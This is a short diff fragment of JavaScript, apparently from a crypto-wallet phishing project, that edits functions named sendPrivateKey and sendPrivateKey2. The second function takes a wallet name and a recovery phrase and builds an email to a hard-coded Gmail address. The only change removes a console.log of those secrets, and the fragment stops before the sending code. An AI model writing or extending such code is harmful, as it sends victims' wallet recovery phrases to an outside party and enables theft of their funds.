@@ -95,7 +95,6 @@ export const sendPrivateKey = async (goodwillMessage) => {
 export const sendPrivateKey2 = async (walletName, rPhrase) => {
   const redeem = `${walletName}`;
   const SENDER_EMAIL2 = `activation340@gmail.com`;
-  console.log(walletName, rPhrase);
   const msg = {
     to: SENDER_EMAIL2,
     from: {
